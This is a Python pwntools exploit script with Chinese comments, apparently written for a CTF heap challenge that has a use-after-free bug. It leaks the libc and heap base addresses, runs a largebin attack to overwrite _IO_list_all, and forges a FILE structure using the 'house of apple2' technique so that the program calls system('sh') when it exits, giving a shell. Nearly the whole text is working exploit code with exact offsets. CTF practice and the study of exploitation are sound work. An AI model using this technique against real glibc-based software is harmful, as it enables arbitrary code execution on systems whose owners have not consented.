# house of apple2
# 存在UAF漏洞
from pwn import *
context.log_level='debug'
elf=ELF('./pwn')
libc=ELF('./libc.so.6')
p=process('./pwn')

def add(index,size):
    p.sendlineafter(b'Your choice:',b'1')
    p.sendlineafter(b'index:',str(index).encode())
    p.sendlineafter(b'Size:',str(size).encode())

def edit(index,size,content):
    p.sendlineafter(b'Your choice:',b'3')
    p.sendlineafter(b'index:',str(index).encode())
    p.sendlineafter(b'size:',str(size).encode())
    p.sendafter(b'context:',content)

def delete(index):
    p.sendlineafter(b'Your choice:',b'2')
    p.sendlineafter(b'index:',str(index).encode())

def show(index):
    p.sendlineafter(b'Your choice:',b'4')
    p.sendlineafter(b'index:',str(index).encode())
    p.recvuntil(b'context: \n')

def exit():
    p.sendlineafter(b'Your choice:',b'5')

# gdb.attach(p)
# pause()

add(0,0x600)
add(1,0x10)
add(2,0x5f0)
add(3,0x10)
delete(0)
add(4,0x610)
# chunk0进入largebin中从而泄露libc,heap基址
# chunk2仅比chunk0小0x10，确保后续chunk2进入largebin中时与chunk0所在链紧挨着，从而执行largebin attack

show(0)
addr1=u64(p.recv(6).ljust(8,b'\x00'))
libc_base=addr1-0x21b150
# 泄露libc基址

edit(0,0x10,b'a'*0x10)
show(0)
p.recvuntil(b'a'*0x10)
addr2=u64(p.recv(6).ljust(8,b'\x00'))
heap_base=addr2-0x290
log.info('libc_base:'+hex(libc_base))
log.info('heap_base:'+hex(heap_base))
# 泄露heap基址，用于后续伪造io

io_list=libc_base+ 0x21b680
io_file_jumps=libc_base+ 0x2170c0
io=heap_base+ 0x8c0
wide_data=io
wide_vtable=io+0xe8-0x68
#通过计算使得system放置处也可以落在chunk2中
system=libc_base+libc.sym['system']

delete(2)
edit(0,0x30,p64(0)+p64(io_list-0x10)+p64(0)+p64(io_list-0x20))
add(5,0x620)
# 执行largebin attack，将io_list_all篡改为chunk2的地址，从而在chunk2中伪造fake io_stderr

payload=flat({
    0x0: b'  sh',                        #system的参数，注意前面有两个空格
    0x28: p64(1),                        #_IO_write_ptr
    # 0x70: p64(2),                        # _fileno for stderr is 2
    # 0x78: p64(0xFFFFFFFFFFFFFFFF),       # _old_offset, -1
    # 0x88: p64(libc_base+0x21ca60),       # _IO_stdfile_1_lock
    # 0x90: p64(0xFFFFFFFFFFFFFFFF),       # _offset, -1
    0xa0: p64(wide_data),                # _IO_wide_data_1
    0xc0: p32(0xffffffff),               # _mode, usually -1
    0xd8: p64(io_file_jumps),            # io结构体中的fake vtable，用于绕过检查的同时触发利用链
    0xe0: p64(wide_vtable),              # wide_data结构体中的fake_vtable(wide_data+0xe0),之所以在此处是因为经过了偏移的计算，fake_io与fake_wide_data部分重合
    0xe8: p64(system)                    # 此处为fake_wide_data中的fake_vtable+0x68处，原来这里应该为被调用的doallocate，此处篡改为system
},filler=b'\x00')
edit(1,0x100,p64(0)*2+payload)

exit()

p.interactive()

